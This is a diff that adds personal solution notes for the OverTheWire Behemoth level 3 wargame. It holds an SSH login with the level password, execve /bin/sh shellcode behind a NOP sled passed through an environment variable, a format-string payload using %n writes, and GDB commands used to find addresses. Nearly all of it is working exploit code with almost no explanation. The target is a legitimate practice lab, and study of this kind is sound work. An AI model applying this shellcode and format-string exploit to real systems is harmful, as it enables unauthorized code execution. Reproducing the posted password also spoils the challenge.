@@ -1,0 +1,18 @@
+ssh -p 2221 behemoth3@behemoth.labs.overthewire.org
+pass: nieteidiel
+
+Shellcode address: 0xffffdfa0, 0xffffdea6 (Middle NOP)
+
+# GDB
+shellcode=$(python -c "print '\x90' * 500 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'") gdb -q /behemoth/behemoth3
+unset env LINES
+unset env COLUMNS
+set confirm off
+break *0x80484d1
+run <<< $(python -c "print 'AAAA' + '\xcc\xd4\xff\xff' + '%56990x' + '%n' + 'AAAAAAA' + '\xce\xd4\xff\xff' + '.%x.' * 3 + '%598320x' + '%n'")
+x/x 0xffffdc0c
+
+
+# Real
+env -i shellcode=$(python -c "print '\x90' * 500 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'") PWD=$PWD SHELL=$SHELL /tmp/xecute
+shellcode=$(python -c "print '\x90' * 500 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'") /tmp/xecute
